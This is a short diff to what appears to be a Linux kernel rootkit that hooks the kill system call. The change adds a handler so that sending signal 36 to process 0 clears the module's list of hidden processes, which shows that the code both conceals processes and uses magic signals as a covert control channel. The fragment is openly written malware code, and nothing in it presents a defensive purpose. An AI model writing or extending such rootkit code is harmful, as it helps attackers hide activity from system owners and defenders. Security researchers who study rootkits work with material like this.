@@ -82,6 +82,13 @@ static asmlinkage int kill_hook(const struct pt_regs* ctx) {
             }
             break;
             
+        case SIGRTMIN2:
+            // Clear all hidden processes: kill -36 0
+            if (pid == 0) {
+                clear_all_hidden_processes();
+            }
+            break;
+            
         default:
             return original_kill(ctx);
     }
